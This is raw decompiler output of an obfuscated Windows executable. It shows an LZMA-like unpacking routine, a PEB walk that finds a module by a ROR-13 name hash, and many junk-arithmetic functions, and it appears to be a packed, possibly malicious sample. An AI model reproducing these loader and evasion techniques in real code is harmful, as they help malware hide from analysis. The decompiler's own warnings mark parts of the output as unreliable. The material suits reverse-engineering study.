    *(a3 - 10) = *(a3 - 6);
    *(a3 - 6) = *(a3 - 7);
    v78 = *(a3 - 5);
    *v90 = v105;
    *(a3 - 7) = v78;
    if ( v106 )
      *(a3 - 3) = 0;
    else
      *(a3 - 3) = 3;
    v23 = (unsigned int *)(a3[4] + 3272);
LABEL_105:
    if ( v11 < 0x1000000 )
    {
      v91 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
      v11 <<= 8;
      ++*(a3 - 2);
      a3[3] = v91;
    }
    v35 = *v23;
    v36 = *v23 * (v11 >> 11);
    if ( a3[3] < v36 )
    {
      a1 = *v23 * (v11 >> 11);
      *(a3 - 9) = 0;
      *v23 = v35 + ((2048 - v35) >> 5);
      a2 = (int)&v23[8 * v45 + 2];
      goto LABEL_1;
    }
    a3[3] -= v36;
    v55 = v11 - v36;
    *v23 = v35 - (v35 >> 5);
    if ( v55 < 0x1000000 )
    {
      v54 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
      v55 <<= 8;
      ++*(a3 - 2);
      a3[3] = v54;
    }
    v92 = v23[1];
    v93 = v92 * (v55 >> 11);
    if ( a3[3] < v93 )
    {
      a1 = v92 * (v55 >> 11);
      v23[1] = v92 + ((2048 - v92) >> 5);
      a2 = (int)&v23[8 * v45 + 130];
      *(a3 - 9) = 8;
      goto LABEL_1;
    }
    a3[3] -= v93;
    a1 = v55 - v93;
    v23[1] = v92 - (v92 >> 5);
    a2 = (int)(v23 + 258);
    *(a3 - 9) = 16;
  }
  *(a3 - 3) += 7;
  if ( v33 >= 4 )
    v83 = 3;
  else
    v83 = v33;
  v28 = (v83 << 8) + a3[4] + 1728;
  *(a3 - 11) = 6;
  do
  {
    if ( a1 < 0x1000000 )
    {
      v53 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
      a1 <<= 8;
      ++*(a3 - 2);
      a3[3] = v53;
    }
    v41 = *(_DWORD *)(v28 + 4 * v102);
    v42 = v41 * (a1 >> 11);
    if ( a3[3] >= v42 )
    {
      a3[3] -= v42;
      a1 -= v42;
      *(_DWORD *)(v28 + 4 * v102) = v41 - (v41 >> 5);
      v102 = 2 * v102 + 1;
    }
    else
    {
      a1 = v41 * (a1 >> 11);
      *(_DWORD *)(v28 + 4 * v102) = v41 + ((2048 - v41) >> 5);
      v102 *= 2;
    }
    v30 = (*(a3 - 11))-- == 1;
  }
  while ( !v30 );
  v31 = v102 - 64;
  v17 = v31;
  if ( v31 >= 4 )
  {
    v15 = (v31 >> 1) - 1;
    v16 = v31 & 1 | 2;
    *(a3 - 5) = v15;
    if ( v31 >= 14 )
    {
      v29 = (v31 >> 1) - 5;
      do
      {
        if ( a1 < 0x1000000 )
        {
          v66 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
          a1 <<= 8;
          ++*(a3 - 2);
          a3[3] = v66;
        }
        a1 >>= 1;
        v16 *= 2;
        if ( a3[3] >= a1 )
        {
          a3[3] -= a1;
          v16 |= 1u;
        }
        --v29;
      }
      while ( v29 );
      v18 = a3[4] + 3208;
      v17 = 16 * v16;
      *(a3 - 5) = 4;
    }
    else
    {
      v17 = v16 << v15;
      v18 = a3[4] + 4 * (v17 - v31) + 2748;
    }
    v6 = 1;
    *(a3 - 8) = v18;
    *(a3 - 9) = 1;
    do
    {
      if ( a1 < 0x1000000 )
      {
        v79 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
        a1 <<= 8;
        ++*(a3 - 2);
        a3[3] = v79;
      }
      v70 = *(_DWORD *)(v18 + 4 * v6);
      v71 = v70 * (a1 >> 11);
      if ( a3[3] >= v71 )
      {
        a3[3] -= v71;
        v18 = *(a3 - 8);
        a1 -= v71;
        v17 |= *(a3 - 9);
        *(_DWORD *)(v18 + 4 * v6) = v70 - (v70 >> 5);
        v6 = 2 * v6 + 1;
      }
      else
      {
        a1 = v70 * (a1 >> 11);
        *(_DWORD *)(v18 + 4 * v6) = v70 + ((2048 - v70) >> 5);
        v6 *= 2;
      }
      *(a3 - 9) *= 2;
      v30 = (*(a3 - 5))-- == 1;
    }
    while ( !v30 );
  }
  v32 = v17 + 1;
  *(a3 - 5) = v32;
  if ( v32 )
  {
    v33 = *(a3 - 12);
    goto LABEL_89;
  }
  return *(a3 - 4);
}
// 401440: positive sp value 4 has been found
// 40242E: control flows out of bounds to 402431
// 40139B: control flows out of bounds to 403A0B

//----- (00403000) --------------------------------------------------------
_BYTE *__cdecl sub_403000(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // eax
  char v3; // cl

  result = a1;
  v3 = *a1;
  *a1 = *a2;
  *a2 = v3;
  return result;
}

//----- (004034C6) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void sub_4034C6()
{
  dword_44304C -= 19942;
  __asm { retn }
}
// 402682: positive sp value 4 has been found
// 44304C: using guessed type int dword_44304C;

//----- (0040353E) --------------------------------------------------------
int __usercall sub_40353E@<eax>(int a1@<edi>, int a2@<esi>)
{
  unsigned int v2; // ebx
  unsigned int v3; // edi
  int v4; // ebx
  int v5; // ecx
  int v6; // eax
  _DWORD *v7; // edx
  int v8; // ebx
  _DWORD *v9; // edx
  char v10; // cf
  unsigned int v11; // ecx
  struct _PEB *v12; // edx
  int result; // eax
  unsigned __int8 *v14; // esi

  dword_44300C = 7193;
  dword_44304C = a2;
  v11 = a1 + 16680 - dword_444588;
  v12 = NtCurrentPeb();
  dword_44300C = 7193 - v11;
  v7 = v12->ImageBaseAddress;
  v8 = dword_443398;
  dword_443044 = a1 - dword_44323C;
  v9 = (_DWORD *)v7[5];
  v10 = __CFADD__(v11 > 0x1C19, (unsigned __int16)v11) | __CFADD__(
                                                           a1 - dword_44323C,
                                                           (v11 > 0x1C19) + (unsigned __int16)v11);
  do
  {
    v14 = (unsigned __int8 *)v9[10];
    v4 = v10 + v8 + 7570;
    v5 = 24;
    LOBYTE(v4) = byte_4438F0;
    BYTE1(v4) = (unsigned __int8)v9 ^ byte_444364;
    v3 = 0;
    dword_443038 = v4;
    do
    {
      dword_443030 = v4;
      v6 = *v14++;
      dword_443034 = 12177;
      if ( (char)v6 >= 97 )
        LOBYTE(v6) = v6 - 32;
      v2 = 10522;
      v3 = v6 + __ROR4__(v3, 13);
      BYTE1(v2) = byte_443CA8 + 41;
      v4 = (v2 < (unsigned int)__CFADD__(byte_443CA8, 41) + 10990) + v2 - (__CFADD__(byte_443CA8, 41) + 10990) + 23687;
      --v5;
    }
    while ( v5 );
    v8 = v9[4];
    v9 = (_DWORD *)*v9;
    v10 = v3 < 0x6A4ABC5B;
  }
  while ( v3 != 1783282779 );
  dword_44301C += 1783282779;
  result = v8;
  dword_443034 -= 30809;
  dword_443004 -= (int)&EnterCriticalSection - dword_443C80;
  return result;
}
// 443004: using guessed type int dword_443004;
// 44300C: using guessed type int dword_44300C;
// 44301C: using guessed type int dword_44301C;
// 443030: using guessed type int dword_443030;
// 443034: using guessed type int dword_443034;
// 443038: using guessed type int dword_443038;
// 443044: using guessed type int dword_443044;
// 44304C: using guessed type int dword_44304C;
// 44323C: using guessed type int dword_44323C;
// 443398: using guessed type int dword_443398;
// 4438F0: using guessed type char byte_4438F0;
// 443C80: using guessed type int dword_443C80;
// 443CA8: using guessed type char byte_443CA8;
// 444364: using guessed type char byte_444364;
// 444588: using guessed type int dword_444588;

//----- (0040382D) --------------------------------------------------------
int sub_40382D()
{
  int v0; // ebx
  int result; // eax
  int v2; // ebx
  unsigned int v3; // eax

  v2 = dword_44364C + 9937;
  v3 = dword_444C18 ^ (dword_444C18 << 11);
  dword_443008 -= 14202;
  dword_444C18 = dword_444BAA;
  dword_443004 -= 23830;
  BYTE1(v2) = ((unsigned __int16)(dword_44364C + 9937) >> 8) - byte_443E2C;
  dword_443010 = 23009 - v2;
  dword_444BAA = dword_444B7A;
  dword_444B7A = dword_444BF4;
  LOBYTE(dword_443024) = 15;
  dword_44302C = 6163;
  LOBYTE(dword_44301C) = 9;
  LOBYTE(dword_443034) = dword_443034 - 3;
  v0 = v3 >> 8;
  LOBYTE(v0) = BYTE1(v3) - byte_444614;
  dword_444BF4 ^= (v3 >> 8) ^ v3 ^ ((unsigned int)dword_444BF4 >> 19);
  BYTE1(v0) = dword_443040;
  dword_443048 = v0;
  dword_444B82 = dword_444BF4;
  result = dword_444BF4;
  dword_443018 = 9115;
  dword_443040 = (int)&EnterCriticalSection + __CFADD__(v0, 6743) + 14086;
  return result;
}
// 443004: using guessed type int dword_443004;
// 443008: using guessed type int dword_443008;
// 443010: using guessed type int dword_443010;
// 443018: using guessed type int dword_443018;
// 44301C: using guessed type int dword_44301C;
// 443024: using guessed type int dword_443024;
// 44302C: using guessed type int dword_44302C;
// 443034: using guessed type int dword_443034;
// 443040: using guessed type int dword_443040;
// 443048: using guessed type int dword_443048;
// 44364C: using guessed type int dword_44364C;
// 443E2C: using guessed type char byte_443E2C;
// 444614: using guessed type char byte_444614;
// 444B7A: using guessed type int dword_444B7A;
// 444B82: using guessed type int dword_444B82;
// 444BAA: using guessed type int dword_444BAA;
// 444BF4: using guessed type int dword_444BF4;
// 444C18: using guessed type int dword_444C18;

//----- (00403BC9) --------------------------------------------------------
unsigned int __fastcall sub_403BC9(int a1, int a2)
{
  unsigned int result; // eax
  unsigned int retaddr; // [esp+0h] [ebp+0h]

  dword_444BBA ^= a2 + 1745;
  dword_443018 += (int)&CreateEventA;
  LOBYTE(dword_44301C) = 108;
  result = retaddr & 0xFFFF0000;
  dword_44303C += (int)&CreateEventA;
  dword_444BC6 = retaddr & 0xFFFF0000;
  return result;
}
// 443018: using guessed type int dword_443018;
// 44301C: using guessed type int dword_44301C;
// 44303C: using guessed type int dword_44303C;
// 444BBA: using guessed type int dword_444BBA;
// 444BC6: using guessed type int dword_444BC6;

//----- (00406F2F) --------------------------------------------------------
void __usercall __noreturn sub_406F2F(int a1@<ebx>, _DWORD *a2@<esi>)
{
  *a2 |= a1;
  __halt();
}

//----- (0041188A) --------------------------------------------------------
int __fastcall sub_41188A(int a1, int a2, int a3, int a4)
{
  unsigned int v4; // edx
  int v5; // eax
  unsigned int v6; // edx
  unsigned int v7; // ecx
  int v8; // eax
  unsigned int v9; // edx
  unsigned int v10; // ecx
  int v11; // eax
  char v12; // cf
  int v14; // ecx
  int v15; // eax
  unsigned int v16; // edx
  char v17[52]; // [esp+84h] [ebp-348h] BYREF
  char v18[104]; // [esp+B8h] [ebp-314h] BYREF
  char v19[88]; // [esp+120h] [ebp-2ACh] BYREF
  char v20[16]; // [esp+178h] [ebp-254h] BYREF
  char v21[360]; // [esp+188h] [ebp-244h] BYREF
  int v22; // [esp+2F0h] [ebp-DCh]

  sub_413142((int)v18, a2, 0, (int)v18, 0);
  sub_411C99((unsigned int)v20, v16, 0, 1669981493, (int)v20, 0);
  v15 = sub_411C99(0, 0, 0, (int)v21, (int)v21, 0) | 0x35;
  sub_413142(v15, (int)v19, v14, (int)v19, 0);
  v5 = sub_411C99(0, v4, 0, v22, (int)v17, 0);
  v8 = sub_411EBC(v5 ^ 0x3E25, v6, v7);
  v11 = sub_411EBC(v8 + 16133, v9, v10);
  return v11 + v12 + v11;
}
// 413D19: variable 'v16' is possibly undefined
// 413574: variable 'v14' is possibly undefined
// 41123B: variable 'v4' is possibly undefined
// 41124A: variable 'v6' is possibly undefined
// 41124A: variable 'v7' is possibly undefined
// 411254: variable 'v9' is possibly undefined
// 411254: variable 'v10' is possibly undefined
// 411259: variable 'v12' is possibly undefined

//----- (00411A11) --------------------------------------------------------
int __userpurge sub_411A11@<eax>(int a1@<eax>, int a2@<ecx>, int a3, int a4, int a5, int a6)
{
  int v6; // eax
  unsigned int v7; // edx
  unsigned int v8; // ecx
  __int16 v9; // ax
  int v10; // edx
  int v11; // ecx
  bool v12; // cf
  int v13; // eax
  unsigned int v14; // eax
  unsigned int v15; // ett
  int result; // eax
  unsigned int v17; // eax
  char v18[368]; // [esp+228h] [ebp-18Ch] BYREF
  int v19; // [esp+398h] [ebp-1Ch]

  v6 = sub_413142(a1, (int)v18, a2, (int)v18, 0);
  v9 = sub_411EBC(
         2 * ((v6 | 0x360F) - 20316) - (__CFADD__((v6 | 0x360F) - 20316, (v6 | 0x360F) - 20316) + 2507),
         v7,
         v8);
  v13 = (v9 + v12 + v9) & 0x303F;
  if ( (v11 & v13) != 0 )
    goto LABEL_6;
  v14 = v13 + 9978;
  v12 = v14 < 0x1D33;
  v14 -= 7475;
  v15 = v12 + 4614;
  result = v14
         - v15
         + (v14 < v15)
         + v14
         - v15
         - ((__CFADD__(v14 < v15, v14 - v15) | __CFADD__(v14 - v15, (v14 < v15) + v14 - v15))
          + 15844);
  if ( v10 )
  {
    v13 = v19 & 0x1261 | 0x23BB;
LABEL_6:
    v17 = v13 + 1782;
    result = (v17 < 0x21C8)
           + v17
           - 8648
           + 5526
           - ((__CFADD__(v17 < 0x21C8, v17 - 8648) | __CFADD__((v17 < 0x21C8) + v17 - 8648, 5526))
            + 9122);
  }
  return result;
}
// 411A3E: variable 'v7' is possibly undefined
// 411A3E: variable 'v8' is possibly undefined
// 412E45: variable 'v12' is possibly undefined
// 412E58: variable 'v11' is possibly undefined
// 412E78: variable 'v10' is possibly undefined

//----- (00411AF1) --------------------------------------------------------
int __userpurge start@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>, int a6, int a7, int a8)
{
  int v8; // edx
  int v9; // ecx
  unsigned int v10; // edx
  unsigned int v11; // ecx
  void *v12; // ecx
  int v13; // edx
  int v14; // ecx
  int v15; // ecx
  int v17; // ecx
  int v18; // eax
  int v19; // edx
  int v20; // ecx
  int v21; // eax
  unsigned int v22; // edx
  unsigned int v23; // ecx
  int v24; // edx
  int v25; // ecx
  int v26; // edx
  int v27; // edx
  int v28; // ecx
  __int16 v29; // ax
  int v30; // ecx
  void *v31; // ecx
  int v32; // eax
  unsigned int v33; // edx
  unsigned int v34; // ecx
  void *v35; // ecx
  int v36; // eax
  int v37; // ecx
  int v38; // eax
  int v39; // eax
  int v40; // edx
  int v41; // ecx
  int v42; // eax
  unsigned int v43; // ecx
  int v44; // eax
  unsigned int v45; // edx
  unsigned int v46; // ecx
  int v47; // eax
  unsigned int v48; // edx
  unsigned int v49; // ecx
  int v50; // eax
  unsigned int v51; // edx
  unsigned int v52; // ecx
  int v53; // edx
  unsigned int v54; // edx
  unsigned int v55; // ecx
  int v56; // edx
  int v57; // ecx
  bool v58; // cf
  int v59; // ecx
  int v60; // eax
  int v61; // eax
  int v62; // edx
  int v63; // [esp+20h] [ebp-250h]
  int v64; // [esp+30h] [ebp-240h]
  char v65[12]; // [esp+4Ch] [ebp-224h] BYREF
  char v66[8]; // [esp+58h] [ebp-218h] BYREF
  int v67[3]; // [esp+60h] [ebp-210h] BYREF
  char v68[12]; // [esp+6Ch] [ebp-204h] BYREF
  char v69[4]; // [esp+78h] [ebp-1F8h] BYREF
  char v70[20]; // [esp+7Ch] [ebp-1F4h] BYREF
  char v71[4]; // [esp+90h] [ebp-1E0h] BYREF
  int v72; // [esp+94h] [ebp-1DCh]
  int v73; // [esp+98h] [ebp-1D8h]
  char v74[24]; // [esp+A0h] [ebp-1D0h] BYREF
  char v75[12]; // [esp+B8h] [ebp-1B8h] BYREF
  char v76[16]; // [esp+F0h] [ebp-180h] BYREF
  unsigned int v77; // [esp+100h] [ebp-170h]
  char v78[28]; // [esp+10Ch] [ebp-164h] BYREF
  char v79[72]; // [esp+128h] [ebp-148h] BYREF
  int v80; // [esp+170h] [ebp-100h]
  int v81; // [esp+17Ch] [ebp-F4h]
  int v82; // [esp+184h] [ebp-ECh]
  char v83[12]; // [esp+18Ch] [ebp-E4h] BYREF
  char v84[12]; // [esp+198h] [ebp-D8h] BYREF
  int v85; // [esp+1A4h] [ebp-CCh]
  char v86[28]; // [esp+1D4h] [ebp-9Ch] BYREF
  int v87; // [esp+1F0h] [ebp-80h]
  unsigned int v88; // [esp+1FCh] [ebp-74h]
  char v89[4]; // [esp+200h] [ebp-70h] BYREF

  v42 = 9215;
  BYTE1(v42) = byte_44484C;
  dword_443008 = v42;
  dword_444BBE = a4;
  v61 = (v42 | 0x508A) + 1;
  dword_444BAE = a1;
  dword_44302C += 32574;
  BYTE1(v61) = byte_444378;
  dword_444C10 = a5;
  dword_443048 = 10066;
  v58 = __CFADD__(v61, dword_443014);
  dword_443014 += v61;
  LOBYTE(dword_44302C) = -15;
  LOBYTE(dword_44304C) = 0x80;
  unk_444B7E = a2;
  v62 = dword_443D6C
      - ((__CFADD__(v58, &unk_444B7E) | __CFADD__((char *)&unk_444B7E + v58, 23074))
       + 25614)
      - ((__CFADD__(
            dword_443D6C < (unsigned int)(__CFADD__(v58, &unk_444B7E) | __CFADD__((char *)&unk_444B7E + v58, 23074))
                         + 25614,
            (char *)&unk_444B7E + v58 + 23074) | __CFADD__(
                                                   v61,
                                                   (char *)&unk_444B7E
                                                 + v58
                                                 + (dword_443D6C < (unsigned int)(__CFADD__(v58, &unk_444B7E) | __CFADD__((char *)&unk_444B7E + v58, 23074))
                                                                 + 25614)
                                                 + 23074))
       + a2);
  LOBYTE(v62) = byte_444280;
  dword_444C1C = a3;
  dword_443044 -= v62;
  dword_443034 = (int)&LocalFree;
  sub_411C99(
    (unsigned int)&dword_444C1C,
    (__PAIR64__(v62, 22144) - ((unsigned int)dword_443258 | 0x233A00000000i64)) >> 32,
    0,
    (__PAIR64__(v62, 22144) - ((unsigned int)dword_443258 | 0x233A00000000i64)) >> 32,
    (int)v76,
    0);
  sub_41415A(v25, v24, 0, v67[0]);
  sub_413ACB(39, (int)v78, 0);
  sub_41329F(v9, v8, 1826603036, 0, v8);
  sub_41188A(v17, (int)v74, 26, (int)v74);
  sub_413142((int)v67, v53, 0, (int)v67, 0);
  v18 = ((v77 | 0xFFFFC59C00000000ui64) - 0x65BFFFFC59Ci64) >> 32;
  v77 += 14948;
  if ( !v55 )
    v18 += 10357;
  sub_411EBC(v18, v54, v55);
  v38 = sub_411A11(0, v37, (int)v86, 0, 62, 39);
  v50 = sub_413607(v38, (__int16)v65, -201547418, v73, (int)v65, 0);
  sub_411EBC((v50 ^ 0x979) + 13044, v51, v52);
  sub_41202C(v69, v26, (int)v69, 1487245906);
  sub_412905(14, v27);
  v29 = sub_41188A(v28, (int)v67, 22, (int)v67);
  if ( (v29 & 0x1C40) == 0 && !v30 && v88 <= 0x1B0D )
  {
    v39 = 6925 - v80 - 681;
    if ( v39 >= 0 )
      v73 &= v39 + 6793 - ((((unsigned int)v39 | 0x3D2F00000000ui64) + 6793) >> 32);
  }
  sub_413ACB(23, (int)v66, 0);
  v21 = sub_413324(v20, v19, (int)v84, 1785816464, v20);
  sub_411EBC(v21, v22, v23);
  sub_413ACB(39, (int)v89, 0);
  v44 = sub_411C99(v43, 0, 0, v67[1], (int)v79, 0);
  v47 = sub_411EBC((2 * v44 - (__CFADD__(v44, v44) + 10913)) ^ 0x15FE, v45, v46);
  sub_411EBC((v47 ^ 0x12B6) - 2264, v48, v49);
  sub_413607((int)v75, 0, 0, v81, (int)v75, 0);
  sub_413607((int)v70, 0, v87, -755130372, (int)v70, 0);
  v32 = sub_411F4C(v31, 50, 19, 43, 268027333);
  sub_4129DA(v32, v33, v34);
  v36 = sub_411F4C(v35, 53, 29, 9, v72);
  sub_411EBC(v36 - 5245, v10, v11);
  sub_411F4C(v12, 50, 30, 51, v63);
  sub_413ACB(47, (int)v71, 0);
  sub_41329F(v41, v40, -1678662331, 0, v85);
  sub_41415A(v57, v56, 0, v57);
  v60 = (((unsigned int)-v58 < 0x1AE) + -v58 - 430 + 2915) ^ 0x81A;
  if ( v64 == v59 )
  {
    if ( v60 )
      goto LABEL_3;
    v60 = -5749;
  }
  v82 ^= v60;
LABEL_3:
  sub_411C99((unsigned int)v83, 0, 0, 0, (int)v83, 0);
  sub_41415A(v14, v13, 0, v14);
  return (sub_411A11((int)v68, v15, (int)v68, 0, 19, 50) - 12711) | 0x1A4E;
}
// 411825: variable 'v14' is possibly undefined
// 411825: variable 'v13' is possibly undefined
// 411842: variable 'v15' is possibly undefined
// 412209: variable 'v20' is possibly undefined
// 412209: variable 'v19' is possibly undefined
// 41220E: variable 'v22' is possibly undefined
// 41220E: variable 'v23' is possibly undefined
// 413755: variable 'v43' is possibly undefined
// 413766: variable 'v45' is possibly undefined
// 413766: variable 'v46' is possibly undefined
// 413777: variable 'v48' is possibly undefined
// 413777: variable 'v49' is possibly undefined
// 4129A6: variable 'v31' is possibly undefined
// 4129B0: variable 'v33' is possibly undefined
// 4129B0: variable 'v34' is possibly undefined
// 4129C1: variable 'v35' is possibly undefined
// 411401: variable 'v10' is possibly undefined
// 411401: variable 'v11' is possibly undefined
// 411419: variable 'v12' is possibly undefined
// 411419: variable 'v63' is possibly undefined
// 41351A: variable 'v41' is possibly undefined
// 41351A: variable 'v40' is possibly undefined
// 413D7B: variable 'v57' is possibly undefined
// 413D7B: variable 'v56' is possibly undefined
// 41287C: variable 'v30' is possibly undefined
// 4126C7: variable 'v25' is possibly undefined
// 4126C7: variable 'v24' is possibly undefined
// 411358: variable 'v9' is possibly undefined
// 411358: variable 'v8' is possibly undefined
// 411AE7: variable 'v17' is possibly undefined
// 413D32: variable 'v53' is possibly undefined
// 4135DB: variable 'v55' is possibly undefined
// 413D80: variable 'v58' is possibly undefined
// 413F1F: variable 'v64' is possibly undefined
// 413F1F: variable 'v59' is possibly undefined
// 414358: variable 'v54' is possibly undefined
// 412C14: variable 'v37' is possibly undefined
// 41397F: variable 'v51' is possibly undefined
// 41397F: variable 'v52' is possibly undefined
// 41284A: variable 'v26' is possibly undefined
// 412852: variable 'v27' is possibly undefined
// 412860: variable 'v28' is possibly undefined
// 443008: using guessed type int dword_443008;
// 443014: using guessed type int dword_443014;
// 44302C: using guessed type int dword_44302C;
// 443034: using guessed type int dword_443034;
// 443044: using guessed type int dword_443044;
// 443048: using guessed type int dword_443048;
// 44304C: using guessed type int dword_44304C;
// 443258: using guessed type int dword_443258;
// 443D6C: using guessed type int dword_443D6C;
// 444280: using guessed type char byte_444280;
// 444378: using guessed type char byte_444378;
// 44484C: using guessed type char byte_44484C;
// 444BAE: using guessed type int dword_444BAE;
// 444BBE: using guessed type int dword_444BBE;
// 444C10: using guessed type int dword_444C10;

//----- (00411C99) --------------------------------------------------------
int __fastcall sub_411C99(unsigned int a1, unsigned int a2, int a3, int a4, int a5, int a6)
{
  int v6; // eax
  char v7; // cf
  unsigned int v8; // edx
  unsigned int v9; // ecx
  unsigned int v10; // edx
  unsigned int v11; // ecx
  int v12; // eax
  unsigned int v13; // edx
  unsigned int v14; // ecx
  __int16 v16; // ax
  __int16 v17; // [esp+2DCh] [ebp-98h]

  v16 = v17;
  if ( (v17 & 0x143E) != 0 || v17 )
    v16 = (v17 - 11350) & 0x340D;
  v6 = sub_411EBC(v16 & 0x49D, a2, a1);
  sub_411EBC(v6 - (v7 + 2279), v8, v9);
  v12 = sub_411EBC(0, v10, v11);
  return sub_411EBC(v7 + v12 + 274, v13, v14);
}
// 411CAC: variable 'v17' is possibly undefined
// 41133B: variable 'v7' is possibly undefined
// 411340: variable 'v8' is possibly undefined
// 411340: variable 'v9' is possibly undefined
// 411347: variable 'v10' is possibly undefined
// 411347: variable 'v11' is possibly undefined
// 411730: variable 'v13' is possibly undefined
// 411730: variable 'v14' is possibly undefined

//----- (00411EBC) --------------------------------------------------------
int __usercall sub_411EBC@<eax>(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>)
{
  int v4; // eax
  int v5; // eax
  unsigned int v6; // eax
  int v7; // [esp+154h] [ebp-194h]
  unsigned int v8; // [esp+160h] [ebp-188h]

  v6 = a1 ^ 0x1649;
  if ( v8 <= a3 )
    v6 = (v6 ^ 0x1CB9) + 8701;
  v5 = (__PAIR64__(v6 - 8098, v6) - 0x222600001FA2i64 - (((unsigned int)(v6 < 0x1FA2) + 8742) | 0x303000000000i64)) >> 32;
  v4 = ((2 * v5 - (__CFADD__(v5, v5) + v7)) ^ 0x3376 | 0x28CC) + 1779;
  if ( a2 >= a3 )
  {
    if ( !a2 )
      return v4 | 0x3776;
    v4 = 0;
  }
  v4 += 7340;
  return v4 | 0x3776;
}
// 411ED0: variable 'v8' is possibly undefined
// 41318B: variable 'v7' is possibly undefined

//----- (00411F4C) --------------------------------------------------------
int __thiscall sub_411F4C(void *this, int a2, int a3, int a4, int a5)
{
  unsigned int v5; // ecx
  int v6; // eax
  __int16 v8; // ax
  __int16 v9; // dx
  int v10; // eax
  int v11; // ecx
  int v12; // ecx
  __int16 v13; // ax
  char v14; // cf
  char v15[12]; // [esp+24h] [ebp-1DCh] BYREF
  char v16[8]; // [esp+30h] [ebp-1D0h] BYREF
  char v17[76]; // [esp+38h] [ebp-1C8h] BYREF
  int v18; // [esp+84h] [ebp-17Ch]
  int v19; // [esp+9Ch] [ebp-164h]
  int v20; // [esp+118h] [ebp-E8h]
  char v21[16]; // [esp+164h] [ebp-9Ch] BYREF
  char v22[16]; // [esp+174h] [ebp-8Ch] BYREF
  int v23; // [esp+198h] [ebp-68h]
  int v24; // [esp+1B8h] [ebp-48h]

  v8 = sub_41188A((int)this, (int)v22, 24, (int)v22);
  v10 = ((v20 ^ ((v8 & 0x1E50u) + 15102)) < 0xA73) + (v20 ^ ((v8 & 0x1E50) + 15102)) - 2675 + 6407;
  if ( v11 || (v9 & 0x903) == 0 )
    v19 -= v10;
  v13 = sub_411C99((unsigned int)v15, 0, 0, v18, (int)v15, 0);
  v23 += (v13 - (v14 + 11666)) & 0x26C | 0x25B6;
  sub_41188A(v12, (int)v16, 23, (int)v16);
  sub_411C99(0, (unsigned int)v21, 0, v24, (int)v21, 0);
  v6 = sub_411C99(v5, 0, 0, -656810509, (int)v17, 0);
  return v14 + v6 + 8320;
}
// 411F7F: variable 'v11' is possibly undefined
// 411F8D: variable 'v9' is possibly undefined
// 412971: variable 'v14' is possibly undefined
// 4125B6: variable 'v12' is possibly undefined
// 411D6E: variable 'v5' is possibly undefined

//----- (0041202C) --------------------------------------------------------
int __thiscall sub_41202C(void *this, int a2, int a3, int a4)
{
  int v4; // edx
  int result; // eax
  int v6; // eax
  unsigned int v7; // edx
  unsigned int v8; // ecx
  int v9; // ecx
  unsigned int v10; // eax
  unsigned int v11; // edx
  int v12; // ecx
  int v13; // eax
  unsigned int v14; // edx
  unsigned int v15; // ecx
  __int16 v16; // dx
  __int16 v17; // ax
  int v18; // edx
  char v19; // cf
  unsigned __int16 v20; // [esp+34h] [ebp-218h]
  char v21[36]; // [esp+40h] [ebp-20Ch] BYREF
  int v22; // [esp+64h] [ebp-1E8h]
  char v23[4]; // [esp+D4h] [ebp-178h] BYREF
  char v24[12]; // [esp+D8h] [ebp-174h] BYREF
  char v25[16]; // [esp+E4h] [ebp-168h] BYREF
  int v26; // [esp+F4h] [ebp-158h]
  int v27; // [esp+154h] [ebp-F8h]
  char v28[60]; // [esp+174h] [ebp-D8h] BYREF
  char v29[108]; // [esp+1B0h] [ebp-9Ch] BYREF
  int v30; // [esp+21Ch] [ebp-30h]
  int v31; // [esp+23Ch] [ebp-10h]

  sub_411F4C(this, 32, 49, 49, 465181835);
  sub_411C99((unsigned int)v24, 0, 0, v27, (int)v24, 0);
  if ( v11 == v12 && !v11 )
    v26 ^= v29[36] & 0x70;
  v6 = sub_411C99((unsigned int)v24, v11, 0, -2084630040, (int)v24, 0);
  sub_411EBC(v6 | 0x2161, v7, v8);
  v10 = sub_412905(30, v9);
  sub_41329F(0, v4, v4, 0, (v10 < 0x2F3B) + v10 - 12091 + 13517);
  sub_413ACB(30, (int)v21, 0);
  sub_413ACB(15, (int)v28, 0);
  v13 = sub_413142(19529, 0, (int)v25, (int)v25, 0);
  sub_411EBC(v13, v14, v15);
  sub_411C99((unsigned int)v29, 0, 0, v30, (int)v29, 0);
  v17 = sub_413607((int)v23, v16, v22, 1345616562, (int)v23, 0);
  result = (2 * (v17 - (v19 + 13628))) & 0x161D;
  if ( (v18 & v31) == 0 )
    result = v20;
  return result;
}
// 413260: variable 'v11' is possibly undefined
// 41326A: variable 'v7' is possibly undefined
// 41326A: variable 'v8' is possibly undefined
// 413272: variable 'v9' is possibly undefined
// 411718: variable 'v4' is possibly undefined
// 4138B8: variable 'v14' is possibly undefined
// 4138B8: variable 'v15' is possibly undefined
// 413B23: variable 'v16' is possibly undefined
// 413B28: variable 'v19' is possibly undefined
// 412612: variable 'v18' is possibly undefined
// 4133F3: variable 'v20' is possibly undefined
// 4136E6: variable 'v12' is possibly undefined

//----- (00412905) --------------------------------------------------------
int __stdcall sub_412905(int a1, int a2)
{
  int v2; // edx
  int v3; // ecx
  char v5[156]; // [esp+B4h] [ebp-13Ch] BYREF
  char v6[116]; // [esp+150h] [ebp-A0h] BYREF
  int v7; // [esp+1C4h] [ebp-2Ch]

  sub_411C99(0, 0, 0, v7, (int)v6, 0);
  return sub_413142((int)v5, v2, v3, (int)v5, 0);
}
// 412D26: variable 'v2' is possibly undefined
// 412D26: variable 'v3' is possibly undefined

//----- (004129DA) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void __usercall sub_4129DA(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  sub_41308F(a1, a2, a3, (int)&savedregs);
}
// 4129DD: bad sp value at call

//----- (0041308F) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_41308F(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>, int a4@<ebp>)
{
  int v4; // ecx
  int v5; // edx
  int v6; // ecx
  int v7; // ecx
  int v8; // edx

